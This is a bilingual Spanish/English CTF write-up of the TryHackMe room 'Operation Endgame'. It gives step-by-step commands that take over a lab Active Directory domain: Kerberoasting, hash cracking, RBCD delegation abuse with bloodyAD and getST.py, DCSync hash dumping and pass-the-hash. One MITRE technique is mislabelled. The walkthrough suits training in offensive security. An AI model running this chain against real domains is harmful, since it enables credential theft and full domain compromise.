# Operation Endgame

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|---|------|------|------|---------|--------|-------------|---------|
| Hard | CTF | `operationendgame` | [TryHackMe](https://tryhackme.com/room/operationendgame) | 03 Level Hard | Web (API THM `api/v2/rooms/tasks?roomCode=operationendgame` + websearch de walkthroughs) | Active Directory / BloodHound / Kerberoasting / RBCD / DCSync / Pass-the-Hash / impacket / bloodyAD | Compromiso completo de Domain Controller a partir de una cuenta guest con permisos delegados desproporcionados. |

---

**Contexto:**

> **ES:** Sala de dominio Active Directory de dificultad Hard que remata en tomar el control del Domain Controller. La cadena arranca desde una cuenta `guest` casi sin privilegios: enumeración con BloodHound (rusthound-ce), Kerberoasting de la cuenta `CODY_ROY`, crackeo del TGS con hashcat, y el descubrimiento de que guest tiene permisos anómalos (misconfig intencionada) que permiten GenericWrite sobre la cuenta de máquina `AD$`. Con Resource-Based Constrained Delegation (RBCD) se falsifica un ticket como Administrator y, tras esparcir los permisos de DCSync, se vuelcan los hashes del DC para acabar con un Pass-the-Hash y leer la flag del escritorio de Administrator.
> **EN:** An Active Directory domain room of Hard difficulty that ends with taking over the Domain Controller. The chain starts from an almost-privilegeless `guest` account: BloodHound enumeration (rusthound-ce), Kerberoasting of the `CODY_ROY` account, TGS cracking with hashcat, and the discovery that guest holds anomalous permissions (intentional misconfiguration) allowing GenericWrite over the machine account `AD$`. Using Resource-Based Constrained Delegation (RBCD) a ticket is forged as Administrator and, after spreading DCSync permissions, the DC hashes are dumped to finish with a Pass-the-Hash and read the flag on the Administrator desktop.

---

## Solucionario

### Task 1: Find The Flag

**Explicación:**
La sala pide obtener la flag final tras comprometer el Domain Controller. La cadena completa: acceso inicial como `guest` (sin contraseña), enumeración con BloodHound, Kerberoasting de `CODY_ROY` y crackeo del TGS con hashcat, abuso de los permisos anómalos de `guest` (GenericWrite sobre `AD$`) mediante Resource-Based Constrained Delegation (RBCD) para falsificar un ticket como Administrator, concesión de permisos DCSync que permiten volcar los hashes del DC con secretsdump y, finalmente, Pass-the-Hash sobre `C:\Users\Administrator\Desktop\flag.txt.txt`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What's the flag? | `THM{...redacted...}` |

---

**Metodología:**

1. Reconocimiento con `nmap` → DC Windows Server 2019 (dominio `thm.local`) con DNS (53), HTTP (80/443), Kerberos (88), SMB (139/445), RPC (135/593), LDAP (389/636/3268/3269), RDP (3389), WSMAN (47001), etc.
2. Acceso inicial como guest: `nxc smb <IP> -u '' -p ''` → null session denegada. `nxc smb <IP> -u guest -p ''` → acceso con `IPC$` en modo solo lectura.
3. Enumeración con BloodHound: `rusthound-ce -d thm.local -u guest -p ''` recolecta datos con el mínimo privilegio → se importan en BloodHound.
4. Kerberoasting: BloodHound señala a `CODY_ROY` como kerberoastable (SPN `HTTP/server.secure.com`). `GetUserSPNs.py thm.local/guest -no-pass -request` → hash TGS `$krb5tgs$23$...`.
5. Crack del TGS: `hashcat -m 13100 hash rockyou.txt` → password de `CODY_ROY` recuperada.
6. Descubrir la anomalía: Con credenciales de `CODY_ROY`, `bloodyAD get writable` revela que guest tiene permisos desproporcionados: GenericWrite sobre la cuenta de máquina `AD$` (misconfig intencionada de la sala).
7. RBCD: `bloodyAD add rbcd "AD$" "CODY_ROY"` añade a `CODY_ROY` como delegado de servicios permitido en `AD$`.
8. Impersonar a Administrator: `getST.py -spn "ldap/AD.THM.LOCAL" -impersonate Administrator -dc-ip <IP> thm.local/cody_roy:<pass>` → S4U2Self + S4U2Proxy → TGT/ticket de Administrador para el LDAP.
9. DCSync: `bloodyAD add dcsync cody_roy` concede permisos de DCSync a `cody_roy` → `secretsdump.py -just-dc-user Administrator -k -no-pass thm.local/Administrator@<IP>` vuelca los hashes.
10. Pass-the-Hash → flag: Con el NT hash de Administrator: `smbclient //<IP>/C$ -U Administrator --pw-nt-hash` (o `atexec`) → leer `C:\Users\Administrator\Desktop\flag.txt.txt` → flag.

### Cadena de ataque / Attack Chain

```
guest (sin password / null denegada)
  -> rusthound-ce + BloodHound
  -> usuario kerberoastable CODY_ROY (SPN HTTP/server.secure.com)
  -> GetUserSPNs.py thm.local/guest -no-pass -request -> $krb5tgs$23$...
  -> hashcat -m 13100 + rockyou -> crack CODY_ROY
  -> anomalia de permisos: guest tiene GenericWrite sobre AD$ (misconfig)
  -> bloodyAD add rbcd "AD$" "CODY_ROY"     (Resource-Based Constrained Delegation)
  -> getST.py -spn ldap/AD.THM.LOCAL -impersonate Administrator (S4U2Self+S4U2Proxy)
  -> bloodyAD add dcsync cody_roy
  -> secretsdump.py -just-dc-user Administrator -> hashes NT de Admin
  -> Pass-the-Hash (smbclient/atexec) -> C:\Users\Administrator\Desktop\flag.txt.txt -> flag
```

**Learning chain:** Guest access → BloodHound enumeration → Kerberoasting (CODY_ROY) → TGS crack → Anomalous GenericWrite permissions → RBCD delegation abuse → Administrator impersonation → DCSync → Pass-the-Hash → DC flag

*Lección:* Una cuenta sin privilegios aparentes (guest) puede ser la llave maestra de un dominio entero si existe una misconfiguración de ACLs. Herramientas como BloodHound convierten la enumeración pasiva en un grafo explotable, y la combinación RBCD + DCSync + Pass-the-Hash demuestra que el control total del DC rara vez requiere una sola técnica: es la orquestación de abusos de confianza lo que decide la partida.

**MITRE ATT&CK:** T1078.002 (Valid Accounts: Domain Accounts), T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting), T1098.001 (Account Manipulation: Additional Cloud Credentials), T1003.006 (OS Credential Dumping: DCSync), T1550.002 (Use Alternate Authentication Material: Pass the Hash)

**Fuente:** [TryHackMe - Operation Endgame](https://tryhackme.com/room/operationendgame)

---

## Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos. **Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe. **Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto. **Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com). **Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.